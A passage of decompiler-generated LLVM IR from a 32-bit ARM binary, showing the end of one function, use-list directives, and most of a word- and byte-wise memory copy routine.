  %v3_158b8 = load i32, i32* %v2_158b8, align 4
  store i32 %v3_158b8, i32* %r3.global-to-local, align 4
  %v1_158bc = load i32, i32* %r6.global-to-local, align 4
  %v2_158bc = add i32 %v1_158bc, 60
  %v3_158bc = inttoptr i32 %v2_158bc to i32*
  store i32 %v3_158b8, i32* %v3_158bc, align 4
  %v0_158c0 = load i32, i32* %r5.global-to-local, align 4
  %v1_158c0 = add i32 %v0_158c0, 44
  %v2_158c0 = inttoptr i32 %v1_158c0 to i32*
  %v3_158c0 = load i32, i32* %v2_158c0, align 4
  store i32 %v3_158c0, i32* %r3.global-to-local, align 4
  %v0_158c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_158c4 = load i32, i32* %ip.global-to-local, align 4
  %v4_158c4 = mul i32 %v1_158c4, 256
  %v5_158c4 = or i32 %v4_158c4, %v0_158c4
  store i32 %v5_158c4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_158cc = load i32, i32* %r6.global-to-local, align 4
  %v2_158cc = add i32 %v1_158cc, 28
  %v3_158cc = inttoptr i32 %v2_158cc to i32*
  store i32 %v5_158c4, i32* %v3_158cc, align 4
  %v0_158d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_158d0 = load i32, i32* %r6.global-to-local, align 4
  %v2_158d0 = add i32 %v1_158d0, 32
  %v3_158d0 = inttoptr i32 %v2_158d0 to i32*
  store i32 %v0_158d0, i32* %v3_158d0, align 4
  %v0_158d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_158d4 = load i32, i32* %r6.global-to-local, align 4
  %v2_158d4 = add i32 %v1_158d4, 36
  %v3_158d4 = inttoptr i32 %v2_158d4 to i32*
  store i32 %v0_158d4, i32* %v3_158d4, align 4
  %v0_158d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_158d8 = load i32, i32* %r6.global-to-local, align 4
  %v2_158d8 = add i32 %v1_158d8, 68
  %v3_158d8 = inttoptr i32 %v2_158d8 to i32*
  store i32 %v0_158d8, i32* %v3_158d8, align 4
  %v0_158dc = load i32, i32* %r5.global-to-local, align 4
  %v1_158dc = add i32 %v0_158dc, 52
  %v2_158dc = inttoptr i32 %v1_158dc to i32*
  %v3_158dc = load i32, i32* %v2_158dc, align 4
  store i32 %v3_158dc, i32* %r3.global-to-local, align 4
  %v1_158e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_158e0 = add i32 %v1_158e0, 76
  %v3_158e0 = inttoptr i32 %v2_158e0 to i32*
  store i32 %v3_158dc, i32* %v3_158e0, align 4
  %v2_158e4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_158e4, i32* %r4.global-to-local, align 4
  ret i32 %v5_158c4

; uselistorder directives
  uselistorder i32 %v0_1587c, { 1, 0, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 5, 4, 0 }
  uselistorder i32 76, { 2, 0, 1 }
  uselistorder i32 68, { 2, 0, 1 }
  uselistorder i32 60, { 3, 1, 2, 0, 4 }
  uselistorder i32 72, { 2, 0, 1 }
  uselistorder i32 64, { 16, 12, 13, 0, 7, 46, 8, 14, 9, 15, 17, 18, 10, 19, 20, 21, 1, 22, 23, 24, 2, 25, 26, 27, 11, 28, 29, 30, 3, 31, 32, 33, 4, 34, 35, 36, 37, 38, 5, 39, 40, 41, 42, 43, 6, 44, 45 }
  uselistorder i32 56, { 4, 2, 3, 6, 5, 0, 1 }
  uselistorder i32 52, { 2, 3, 0, 1, 4, 5, 6 }
  uselistorder i32 15, { 13, 12, 11, 2, 0, 21, 3, 4, 5, 6, 7, 8, 9, 14, 15, 10, 16, 17, 18, 19, 1, 20 }
  uselistorder i32 14, { 9, 8, 17, 7, 1, 2, 3, 4, 5, 10, 11, 6, 12, 13, 14, 15, 0, 16 }
  uselistorder i32 13, { 17, 13, 12, 4, 2, 14, 15, 16, 47, 5, 48, 0, 1, 6, 7, 8, 9, 18, 19, 20, 21, 22, 10, 23, 24, 25, 26, 27, 28, 29, 30, 11, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 3, 45, 46 }
  uselistorder i32 9, { 48, 49, 50, 10, 5, 71, 6, 40, 7, 65, 37, 12, 42, 13, 41, 11, 3, 66, 38, 67, 2, 39, 14, 69, 70, 16, 15, 43, 44, 17, 18, 19, 45, 20, 46, 21, 47, 0, 22, 23, 24, 25, 1, 26, 27, 68, 51, 52, 8, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 4, 64, 28, 29, 30, 31, 32, 33, 34, 35, 36, 72, 73, 9, 74 }
  uselistorder i32 (i8*, i32)* @function_13cd0, { 1, 0, 8, 7, 5, 2, 3, 4, 6 }
  uselistorder i32 88, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
}

define i32 @function_158e8(i32 %arg1) local_unnamed_addr {
dec_label_pc_158e8:
  ret i32 %arg1
}

define i32 @function_158f0() local_unnamed_addr {
dec_label_pc_158f0:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_158f0 = load i32, i32* @r1, align 4
  %v1_158f0 = load i32, i32* @r0, align 4
  %v2_158f0 = sub i32 %v0_158f0, %v1_158f0
  %v3_158f0 = icmp ult i32 %v0_158f0, %v1_158f0
  %v4_158f0 = xor i32 %v1_158f0, %v0_158f0
  %v5_158f0 = xor i32 %v2_158f0, %v0_158f0
  %v6_158f0 = and i32 %v5_158f0, %v4_158f0
  %v7_158f0 = icmp slt i32 %v6_158f0, 0
  store i1 %v7_158f0, i1* %cpsr_v.global-to-local, align 1
  %v8_158f0 = icmp slt i32 %v2_158f0, 0
  store i1 %v8_158f0, i1* %cpsr_n.global-to-local, align 1
  %v9_158f0 = icmp eq i32 %v0_158f0, %v1_158f0
  store i1 %v9_158f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_158f0, label %dec_label_pc_15b3c, label %dec_label_pc_158f8

dec_label_pc_158f8:                               ; preds = %dec_label_pc_158f0
  br i1 %v9_158f0, label %.thread122, label %bb

.thread122:                                       ; preds = %bb144, %.thread121, %bb141, %dec_label_pc_158f8
  %merge = phi i32 [ %v0_158f0, %dec_label_pc_158f8 ], [ %v2_15bd0, %bb141 ], [ %v11_15bec, %bb144 ], [ %v7_15bec, %.thread121 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_158f8
  store i32 %v1_158f0, i32* %stack_var_-8, align 4
  %v0_15900 = load i32, i32* @r2, align 4
  %v2_15900 = add i32 %v0_15900, -4
  store i32 %v2_15900, i32* %r2.global-to-local, align 4
  %v4_15900 = sub i32 3, %v0_15900
  %v5_15900 = and i32 %v4_15900, %v0_15900
  %v6_15900 = icmp slt i32 %v5_15900, 0
  store i1 %v6_15900, i1* %cpsr_v.global-to-local, align 1
  %v7_15900 = icmp slt i32 %v2_15900, 0
  store i1 %v7_15900, i1* %cpsr_n.global-to-local, align 1
  %v8_15900 = icmp eq i32 %v0_15900, 4
  store i1 %v8_15900, i1* %cpsr_z.global-to-local, align 1
  %v5_15904 = icmp slt i32 %v0_15900, 4
  br i1 %v5_15904, label %bb131, label %dec_label_pc_15908

dec_label_pc_15908:                               ; preds = %bb
  %v1_15908 = urem i32 %v1_158f0, 4
  store i32 %v1_15908, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15908 = icmp eq i32 %v1_15908, 0
  store i1 %v2_15908, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15908, label %dec_label_pc_15910, label %dec_label_pc_159b4

dec_label_pc_15910:                               ; preds = %dec_label_pc_15908
  %v1_15910 = urem i32 %v0_158f0, 4
  store i32 %v1_15910, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15910 = icmp eq i32 %v1_15910, 0
  store i1 %v2_15910, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_158f0 to i2
  br i1 %v2_15910, label %dec_label_pc_15918, label %dec_label_pc_159e4

dec_label_pc_15918:                               ; preds = %dec_label_pc_15910, %dec_label_pc_159dc
  %v0_1593092 = phi i32 [ %v1_158f0, %dec_label_pc_15910 ], [ %v0_15a2c75, %dec_label_pc_159dc ]
  %v0_1592c91 = phi i32 [ %v0_158f0, %dec_label_pc_15910 ], [ %v0_159dc, %dec_label_pc_159dc ]
  %v0_15918 = phi i32 [ %v2_15900, %dec_label_pc_15910 ], [ %v2_159d4, %dec_label_pc_159dc ]
  %v2_15918 = add i32 %v0_15918, -8
  store i32 %v2_15918, i32* %r2.global-to-local, align 4
  %v4_15918 = sub i32 7, %v0_15918
  %v5_15918 = and i32 %v4_15918, %v0_15918
  %v6_15918 = icmp slt i32 %v5_15918, 0
  store i1 %v6_15918, i1* %cpsr_v.global-to-local, align 1
  %v7_15918 = icmp slt i32 %v2_15918, 0
  store i1 %v7_15918, i1* %cpsr_n.global-to-local, align 1
  %v8_15918 = icmp eq i32 %v0_15918, 8
  store i1 %v8_15918, i1* %cpsr_z.global-to-local, align 1
  %v5_1591c = icmp slt i32 %v0_15918, 8
  br i1 %v5_1591c, label %dec_label_pc_1596c, label %dec_label_pc_15920

dec_label_pc_15920:                               ; preds = %dec_label_pc_15918
  %v2_15920 = add i32 %v0_15918, -28
  store i32 %v2_15920, i32* %r2.global-to-local, align 4
  %v4_15920 = sub i32 27, %v0_15918
  %v5_15920 = and i32 %v4_15920, %v2_15918
  %v6_15920 = icmp slt i32 %v5_15920, 0
  store i1 %v6_15920, i1* %cpsr_v.global-to-local, align 1
  %v7_15920 = icmp slt i32 %v2_15920, 0
  store i1 %v7_15920, i1* %cpsr_n.global-to-local, align 1
  %v8_15920 = icmp eq i32 %v2_15918, 20
  store i1 %v8_15920, i1* %cpsr_z.global-to-local, align 1
  %v5_15924 = icmp slt i32 %v2_15918, 20
  br i1 %v5_15924, label %dec_label_pc_15958, label %dec_label_pc_15928

dec_label_pc_15928:                               ; preds = %dec_label_pc_15920
  %v0_15928 = load i32, i32* @r4, align 4
  store i32 %v0_15928, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1592c

dec_label_pc_1592c:                               ; preds = %dec_label_pc_1592c.dec_label_pc_1592c_crit_edge, %dec_label_pc_15928
  %v0_15930 = phi i32 [ %v12_15938, %dec_label_pc_1592c.dec_label_pc_1592c_crit_edge ], [ %v0_1593092, %dec_label_pc_15928 ]
  %v0_1592c = phi i32 [ %v0_1592c.pre, %dec_label_pc_1592c.dec_label_pc_1592c_crit_edge ], [ %v0_1592c91, %dec_label_pc_15928 ]
  %v1_1592c = inttoptr i32 %v0_1592c to i32*
  %v2_1592c = load i32, i32* %v1_1592c, align 4
  store i32 %v2_1592c, i32* %r3.global-to-local, align 4
  %v3_1592c = add i32 %v0_1592c, 4
  %v4_1592c = inttoptr i32 %v3_1592c to i32*
  %v5_1592c = load i32, i32* %v4_1592c, align 4
  store i32 %v5_1592c, i32* %r4.global-to-local, align 4
  %v6_1592c = add i32 %v0_1592c, 8
  %v7_1592c = inttoptr i32 %v6_1592c to i32*
  %v8_1592c = load i32, i32* %v7_1592c, align 4
  store i32 %v8_1592c, i32* %ip.global-to-local, align 4
  %v9_1592c = add i32 %v0_1592c, 12
  %v10_1592c = inttoptr i32 %v9_1592c to i32*
  %v11_1592c = load i32, i32* %v10_1592c, align 4
  store i32 %v11_1592c, i32* %lr.global-to-local, align 4
  %v12_1592c = add i32 %v0_1592c, 16
  store i32 %v12_1592c, i32* %r1.global-to-local, align 4
  %v1_15930 = inttoptr i32 %v0_15930 to i32*
  store i32 %v2_1592c, i32* %v1_15930, align 4
  %v3_15930 = add i32 %v0_15930, 4
  %v4_15930 = inttoptr i32 %v3_15930 to i32*
  %v5_15930 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15930, i32* %v4_15930, align 4
  %v6_15930 = add i32 %v0_15930, 8
  %v7_15930 = inttoptr i32 %v6_15930 to i32*
  %v8_15930 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_15930, i32* %v7_15930, align 4
  %v9_15930 = add i32 %v0_15930, 12
  %v10_15930 = inttoptr i32 %v9_15930 to i32*
  %v11_15930 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_15930, i32* %v10_15930, align 4
  %v12_15930 = add i32 %v0_15930, 16
  store i32 %v12_15930, i32* %r0.global-to-local, align 4
  %v0_15934 = load i32, i32* %r1.global-to-local, align 4
  %v1_15934 = inttoptr i32 %v0_15934 to i32*
  %v2_15934 = load i32, i32* %v1_15934, align 4
  store i32 %v2_15934, i32* %r3.global-to-local, align 4
  %v3_15934 = add i32 %v0_15934, 4
  %v4_15934 = inttoptr i32 %v3_15934 to i32*
  %v5_15934 = load i32, i32* %v4_15934, align 4
  store i32 %v5_15934, i32* %r4.global-to-local, align 4
  %v6_15934 = add i32 %v0_15934, 8
  %v7_15934 = inttoptr i32 %v6_15934 to i32*
  %v8_15934 = load i32, i32* %v7_15934, align 4
  store i32 %v8_15934, i32* @ip, align 4
  %v9_15934 = add i32 %v0_15934, 12
  %v10_15934 = inttoptr i32 %v9_15934 to i32*
  %v11_15934 = load i32, i32* %v10_15934, align 4
  store i32 %v11_15934, i32* @lr, align 4
  %v12_15934 = add i32 %v0_15934, 16
  store i32 %v12_15934, i32* @r1, align 4
  %v1_15938 = inttoptr i32 %v12_15930 to i32*
  store i32 %v2_15934, i32* %v1_15938, align 4
  %v3_15938 = add i32 %v0_15930, 20
  %v4_15938 = inttoptr i32 %v3_15938 to i32*
  %v5_15938 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15938, i32* %v4_15938, align 4
  %v6_15938 = add i32 %v0_15930, 24
  %v7_15938 = inttoptr i32 %v6_15938 to i32*
  %v8_15938 = load i32, i32* @ip, align 4
  store i32 %v8_15938, i32* %v7_15938, align 4
  %v9_15938 = add i32 %v0_15930, 28
  %v10_15938 = inttoptr i32 %v9_15938 to i32*
  %v11_15938 = load i32, i32* @lr, align 4
  store i32 %v11_15938, i32* %v10_15938, align 4
  %v12_15938 = add i32 %v0_15930, 32
  store i32 %v12_15938, i32* @r0, align 4
  %v0_1593c = load i32, i32* %r2.global-to-local, align 4
  %v2_1593c = add i32 %v0_1593c, -32
  store i32 %v2_1593c, i32* %r2.global-to-local, align 4
  %v6_15940 = icmp slt i32 %v0_1593c, 32
  br i1 %v6_15940, label %dec_label_pc_15944, label %dec_label_pc_1592c.dec_label_pc_1592c_crit_edge

dec_label_pc_1592c.dec_label_pc_1592c_crit_edge:  ; preds = %dec_label_pc_1592c
  %v0_1592c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1592c

dec_label_pc_15944:                               ; preds = %dec_label_pc_1592c
  %v4_15944 = add i32 %v0_1593c, -16
  %v6_15944 = add i32 %v0_1593c, 2147483616
  %v7_15944 = and i32 %v4_15944, %v6_15944
  %v8_15944 = icmp slt i32 %v7_15944, 0
  store i1 %v8_15944, i1* %cpsr_v.global-to-local, align 1
  %v9_15944 = icmp slt i32 %v4_15944, 0
  store i1 %v9_15944, i1* %cpsr_n.global-to-local, align 1
  %v10_15944 = icmp eq i32 %v4_15944, 0
  store i1 %v10_15944, i1* %cpsr_z.global-to-local, align 1
  %v5_15948 = icmp slt i32 %v2_1593c, -16
  br i1 %v5_15948, label %.thread1, label %bb128

bb128:                                            ; preds = %dec_label_pc_15944
  %v6_15948 = load i32, i32* @r1, align 4
  %v7_15948 = inttoptr i32 %v6_15948 to i32*
  %v8_15948 = load i32, i32* %v7_15948, align 4
  store i32 %v8_15948, i32* %r3.global-to-local, align 4
  %v9_15948 = add i32 %v6_15948, 4
  %v10_15948 = inttoptr i32 %v9_15948 to i32*
  %v11_15948 = load i32, i32* %v10_15948, align 4
  store i32 %v11_15948, i32* %r4.global-to-local, align 4
  %v12_15948 = add i32 %v6_15948, 8
  %v13_15948 = inttoptr i32 %v12_15948 to i32*
  %v14_15948 = load i32, i32* %v13_15948, align 4
  store i32 %v14_15948, i32* @ip, align 4
  %v15_15948 = add i32 %v6_15948, 12
  %v16_15948 = inttoptr i32 %v15_15948 to i32*
  %v17_15948 = load i32, i32* %v16_15948, align 4
  store i32 %v17_15948, i32* @lr, align 4
  %v18_15948 = add i32 %v6_15948, 16
  store i32 %v18_15948, i32* @r1, align 4
  %v7_1594c = inttoptr i32 %v12_15938 to i32*
  store i32 %v8_15948, i32* %v7_1594c, align 4
  %v9_1594c = add i32 %v0_15930, 36
  %v10_1594c = inttoptr i32 %v9_1594c to i32*
  %v11_1594c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_1594c, i32* %v10_1594c, align 4
  %v12_1594c = add i32 %v0_15930, 40
  %v13_1594c = inttoptr i32 %v12_1594c to i32*
  %v14_1594c = load i32, i32* @ip, align 4
  store i32 %v14_1594c, i32* %v13_1594c, align 4
  %v15_1594c = add i32 %v0_15930, 44
  %v16_1594c = inttoptr i32 %v15_1594c to i32*
  %v17_1594c = load i32, i32* @lr, align 4
  store i32 %v17_1594c, i32* %v16_1594c, align 4
  %v18_1594c = add i32 %v0_15930, 48
  store i32 %v18_1594c, i32* @r0, align 4
  %v6_15950 = load i32, i32* %r2.global-to-local, align 4
  %v7_15950 = add i32 %v6_15950, -16
  store i32 %v7_15950, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15944, %bb128
  %v3_15960101 = phi i32 [ %v12_15938, %dec_label_pc_15944 ], [ %v18_1594c, %bb128 ]
  %v0_1595895 = phi i32 [ %v2_1593c, %dec_label_pc_15944 ], [ %v7_15950, %bb128 ]
  %v2_15954 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15954, i32* @r4, align 4
  br label %dec_label_pc_15958

dec_label_pc_15958:                               ; preds = %dec_label_pc_15920, %.thread1
  %v3_15960100 = phi i32 [ %v0_1593092, %dec_label_pc_15920 ], [ %v3_15960101, %.thread1 ]
  %v0_15958 = phi i32 [ %v2_15920, %dec_label_pc_15920 ], [ %v0_1595895, %.thread1 ]
  %v1_15958 = add i32 %v0_15958, 20
  store i32 %v1_15958, i32* %r2.global-to-local, align 4
  %v3_15958 = sub i32 0, %v0_15958
  %v4_15958 = and i32 %v1_15958, %v3_15958
  %v5_15958 = icmp slt i32 %v4_15958, 0
  store i1 %v5_15958, i1* %cpsr_v.global-to-local, align 1
  %v6_15958 = icmp slt i32 %v1_15958, 0
  store i1 %v6_15958, i1* %cpsr_n.global-to-local, align 1
  %v7_15958 = icmp eq i32 %v1_15958, 0
  store i1 %v7_15958, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1595c

dec_label_pc_1595c:                               ; preds = %.thread117, %dec_label_pc_15958
  %v0_1596c.pre147 = phi i32 [ %v0_1596c.pre, %.thread117 ], [ %v1_15958, %dec_label_pc_15958 ]
  %v3_15960 = phi i32 [ %v3_1596098118, %.thread117 ], [ %v3_15960100, %dec_label_pc_15958 ]
  %v1_15964 = phi i1 [ %v1_15968, %.thread117 ], [ %v5_15958, %dec_label_pc_15958 ]
  %v0_15964 = phi i1 [ %v0_15968, %.thread117 ], [ %v6_15958, %dec_label_pc_15958 ]
  %v2_1595c = xor i1 %v1_15964, %v0_15964
  br i1 %v2_1595c, label %.thread117, label %bb129

bb129:                                            ; preds = %dec_label_pc_1595c
  %v3_1595c = load i32, i32* @r1, align 4
  %v4_1595c = inttoptr i32 %v3_1595c to i32*
  %v5_1595c = load i32, i32* %v4_1595c, align 4
  store i32 %v5_1595c, i32* %r3.global-to-local, align 4
  %v6_1595c = add i32 %v3_1595c, 4
  %v7_1595c = inttoptr i32 %v6_1595c to i32*
  %v8_1595c = load i32, i32* %v7_1595c, align 4
  store i32 %v8_1595c, i32* @ip, align 4
  %v9_1595c = add i32 %v3_1595c, 8
  %v10_1595c = inttoptr i32 %v9_1595c to i32*
  %v11_1595c = load i32, i32* %v10_1595c, align 4
  store i32 %v11_1595c, i32* @lr, align 4
  %v12_1595c = add i32 %v3_1595c, 12
  store i32 %v12_1595c, i32* @r1, align 4
  %v4_15960 = inttoptr i32 %v3_15960 to i32*
  store i32 %v5_1595c, i32* %v4_15960, align 4
  %v6_15960 = add i32 %v3_15960, 4
  %v7_15960 = inttoptr i32 %v6_15960 to i32*
  %v8_15960 = load i32, i32* @ip, align 4
  store i32 %v8_15960, i32* %v7_15960, align 4
  %v9_15960 = add i32 %v3_15960, 8
  %v10_15960 = inttoptr i32 %v9_15960 to i32*
  %v11_15960 = load i32, i32* @lr, align 4
  store i32 %v11_15960, i32* %v10_15960, align 4
  %v12_15960 = add i32 %v3_15960, 12
  store i32 %v12_15960, i32* @r0, align 4
  %v3_15964 = load i32, i32* %r2.global-to-local, align 4
  %v4_15964 = add i32 %v3_15964, -12
  store i32 %v4_15964, i32* %r2.global-to-local, align 4
  %v6_15964 = sub i32 11, %v3_15964
  %v7_15964 = and i32 %v6_15964, %v3_15964
  %v8_15964 = icmp slt i32 %v7_15964, 0
  store i1 %v8_15964, i1* %cpsr_v.global-to-local, align 1
  %v9_15964 = icmp slt i32 %v4_15964, 0
  store i1 %v9_15964, i1* %cpsr_n.global-to-local, align 1
  %v10_15964 = icmp eq i32 %v3_15964, 12
  store i1 %v10_15964, i1* %cpsr_z.global-to-local, align 1
  br label %.thread117

.thread117:                                       ; preds = %dec_label_pc_1595c, %bb129
  %v0_1596c.pre = phi i32 [ %v4_15964, %bb129 ], [ %v0_1596c.pre147, %dec_label_pc_1595c ]
  %v3_1596098118 = phi i32 [ %v12_15960, %bb129 ], [ %v3_15960, %dec_label_pc_1595c ]
  %v1_15968 = phi i1 [ %v8_15964, %bb129 ], [ %v1_15964, %dec_label_pc_1595c ]
  %v0_15968 = phi i1 [ %v9_15964, %bb129 ], [ %v0_15964, %dec_label_pc_1595c ]
  %v2_15968 = xor i1 %v1_15968, %v0_15968
  br i1 %v2_15968, label %dec_label_pc_1596c, label %dec_label_pc_1595c

dec_label_pc_1596c:                               ; preds = %.thread117, %dec_label_pc_15918
  %v7_1597c = phi i32 [ %v0_1593092, %dec_label_pc_15918 ], [ %v3_1596098118, %.thread117 ]
  %v0_1596c = phi i32 [ %v2_15918, %dec_label_pc_15918 ], [ %v0_1596c.pre, %.thread117 ]
  %v2_1596c = add i32 %v0_1596c, 8
  store i32 %v2_1596c, i32* %r2.global-to-local, align 4
  %v4_1596c = sub i32 0, %v0_1596c
  %v5_1596c = and i32 %v2_1596c, %v4_1596c
  %v6_1596c = icmp slt i32 %v5_1596c, 0
  store i1 %v6_1596c, i1* %cpsr_v.global-to-local, align 1
  %v7_1596c = icmp slt i32 %v2_1596c, 0
  store i1 %v7_1596c, i1* %cpsr_n.global-to-local, align 1
  %v8_1596c = icmp eq i32 %v2_1596c, 0
  store i1 %v8_1596c, i1* %cpsr_z.global-to-local, align 1
  %v5_15970 = icmp slt i32 %v0_1596c, -8
  br i1 %v5_15970, label %bb131, label %dec_label_pc_15974

dec_label_pc_15974:                               ; preds = %dec_label_pc_1596c
  %v6_15974 = add i32 %v0_1596c, 4
  store i32 %v6_15974, i32* %r2.global-to-local, align 4
  %v8_15974 = sub i32 -5, %v0_1596c
  %v9_15974 = and i32 %v8_15974, %v2_1596c
  %v10_15974 = icmp slt i32 %v9_15974, 0
  store i1 %v10_15974, i1* %cpsr_v.global-to-local, align 1
  %v11_15974 = icmp slt i32 %v6_15974, 0
  store i1 %v11_15974, i1* %cpsr_n.global-to-local, align 1
  %v12_15974 = icmp eq i32 %v2_1596c, 4
  store i1 %v12_15974, i1* %cpsr_z.global-to-local, align 1
  %v5_15978 = icmp slt i32 %v2_1596c, 4
  %v6_15978 = load i32, i32* @r1, align 4
  %v7_15978 = inttoptr i32 %v6_15978 to i32*
  %v8_15978 = load i32, i32* %v7_15978, align 4
  store i32 %v8_15978, i32* %r3.global-to-local, align 4
  %v10_15978 = add i32 %v6_15978, 4
  br i1 %v5_15978, label %.thread5, label %bb130

.thread5:                                         ; preds = %dec_label_pc_15974
  store i32 %v10_15978, i32* @r1, align 4
  %v8_1597c = inttoptr i32 %v7_1597c to i32*
  store i32 %v8_15978, i32* %v8_1597c, align 4
  %v9_1597c = load i32, i32* @r0, align 4
  %v10_1597c = add i32 %v9_1597c, 4
  store i32 %v10_1597c, i32* @r0, align 4
  %v0_1598c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb131

bb130:                                            ; preds = %dec_label_pc_15974
  %v10_15980 = inttoptr i32 %v10_15978 to i32*
  %v11_15980 = load i32, i32* %v10_15980, align 4
  store i32 %v11_15980, i32* @ip, align 4
  %v12_15980 = add i32 %v6_15978, 8
  store i32 %v12_15980, i32* @r1, align 4
  %v7_15984 = inttoptr i32 %v7_1597c to i32*
  store i32 %v8_15978, i32* %v7_15984, align 4
  %v9_15984 = add i32 %v7_1597c, 4
  %v10_15984 = inttoptr i32 %v9_15984 to i32*
  %v11_15984 = load i32, i32* @ip, align 4
  store i32 %v11_15984, i32* %v10_15984, align 4
  %v12_15984 = add i32 %v7_1597c, 8
  store i32 %v12_15984, i32* @r0, align 4
  %v6_15988 = load i32, i32* %r2.global-to-local, align 4
  %v7_15988 = add i32 %v6_15988, -4
  store i32 %v7_15988, i32* %r2.global-to-local, align 4
  br label %bb131

bb131:                                            ; preds = %.thread5, %.thread11, %dec_label_pc_1596c, %bb, %dec_label_pc_15b34, %dec_label_pc_15ac8, %dec_label_pc_15a5c, %bb130
  %v2_1599c = phi i32 [ %v10_1597c, %.thread5 ], [ %v0_15a2c75, %.thread11 ], [ %v7_1597c, %dec_label_pc_1596c ], [ %v1_158f0, %bb ], [ %v2_1599c113, %dec_label_pc_15b34 ], [ %v2_1599c112, %dec_label_pc_15ac8 ], [ %v2_1599c111, %dec_label_pc_15a5c ], [ %v12_15984, %bb130 ]
  %v0_1598c = phi i32 [ %v0_1598c.pre, %.thread5 ], [ %v2_159d4, %.thread11 ], [ %v2_1596c, %dec_label_pc_1596c ], [ %v2_15900, %bb ], [ %v0_1598c109, %dec_label_pc_15b34 ], [ %v0_1598c108, %dec_label_pc_15ac8 ], [ %v0_1598c107, %dec_label_pc_15a5c ], [ %v7_15988, %bb130 ]
  %v1_1598c = add i32 %v0_1598c, 4
  store i32 %v1_1598c, i32* %r2.global-to-local, align 4
  %v3_1598c = sub i32 0, %v0_1598c
  %v4_1598c = and i32 %v1_1598c, %v3_1598c
  %v5_1598c = icmp slt i32 %v4_1598c, 0
  store i1 %v5_1598c, i1* %cpsr_v.global-to-local, align 1
  %v6_1598c = icmp slt i32 %v1_1598c, 0
  store i1 %v6_1598c, i1* %cpsr_n.global-to-local, align 1
  %v7_1598c = icmp eq i32 %v1_1598c, 0
  store i1 %v7_1598c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1598c, label %bb132, label %bb133

bb132:                                            ; preds = %bb131
  %v3_15990 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_15990, i32* %r0.global-to-local, align 4
  ret i32 %v3_15990

bb133:                                            ; preds = %bb131
  %v1_15994 = add i32 %v0_1598c, 2
  %v3_15994 = sub i32 -3, %v0_1598c
  %v4_15994 = and i32 %v3_15994, %v1_1598c
  %v5_15994 = icmp slt i32 %v4_15994, 0
  store i1 %v5_15994, i1* %cpsr_v.global-to-local, align 1
  %v6_15994 = icmp slt i32 %v1_15994, 0
  store i1 %v6_15994, i1* %cpsr_n.global-to-local, align 1
  %v7_15994 = icmp eq i32 %v1_1598c, 2
  store i1 %v7_15994, i1* %cpsr_z.global-to-local, align 1
  %v0_15998 = load i32, i32* @r1, align 4
  %v1_15998 = inttoptr i32 %v0_15998 to i8*
  %v2_15998 = load i8, i8* %v1_15998, align 1
  %v3_15998 = zext i8 %v2_15998 to i32
  store i32 %v3_15998, i32* %r3.global-to-local, align 4
  %v5_15998 = add i32 %v0_15998, 1
  store i32 %v5_15998, i32* %r1.global-to-local, align 4
  %v3_1599c = inttoptr i32 %v2_1599c to i8*
  store i8 %v2_15998, i8* %v3_1599c, align 1
  %v4_1599c = load i32, i32* @r0, align 4
  %v5_1599c = add i32 %v4_1599c, 1
  store i32 %v5_1599c, i32* %r0.global-to-local, align 4
  %v0_159a0 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_159a0 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_159a0 = xor i1 %v0_159a0, %v1_159a0
  br i1 %v2_159a0, label %.thread119, label %bb134

bb134:                                            ; preds = %bb133
  %v3_159a0 = load i32, i32* %r1.global-to-local, align 4
  %v4_159a0 = inttoptr i32 %v3_159a0 to i8*
  %v5_159a0 = load i8, i8* %v4_159a0, align 1
  %v6_159a0 = zext i8 %v5_159a0 to i32
  store i32 %v6_159a0, i32* %r3.global-to-local, align 4
  %v8_159a0 = add i32 %v3_159a0, 1
  store i32 %v8_159a0, i32* %r1.global-to-local, align 4
  %v6_159a4 = inttoptr i32 %v5_1599c to i8*
  store i8 %v5_159a0, i8* %v6_159a4, align 1
  %v7_159a4 = load i32, i32* %r0.global-to-local, align 4
  %v8_159a4 = add i32 %v7_159a4, 1
  store i32 %v8_159a4, i32* %r0.global-to-local, align 4
